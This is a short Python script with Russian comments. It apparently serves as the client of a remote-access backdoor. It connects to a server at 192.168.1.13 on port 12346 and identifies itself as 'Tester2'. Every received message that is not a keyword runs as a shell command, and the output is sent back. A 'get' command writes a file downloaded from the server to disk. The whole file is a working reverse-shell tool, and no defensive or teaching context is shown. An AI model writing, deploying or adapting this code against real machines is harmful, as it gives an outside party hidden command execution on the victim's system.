def run_command(cmd):
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    b = bytes(result.stdout+result.stderr, "cp866")
    s = str(b, "cp866")
    return s
import socket,subprocess
client = socket.socket()  # создаем сокет клиента
hostname = socket.gethostname()  # получаем хост локальной машины
port = 12346  # устанавливаем порт сервера
client.connect(('192.168.1.13', port))  # подключаемся к серверу
#while True:
client.send('Tester2'.encode())
while True:
    data=client.recv(1024)
    data=data.decode()
    if "send" in data:
        pass
    elif "get" in data:
        client.send(data.encode())  # отправляем сообщение серверу
        fx = open("gettedDataFromServer", "wb")
        while True:
            data = client.recv(1024)  # получаем данные от сервера
            #            print(bytes.decode(data))
            fx.write(data)
            if not data: break
        fx.close()
        client.close()
    elif "start" in data:
        pass
    else:
        res=run_command(data)
        res=res.encode()
        client.send(res)
    print(data)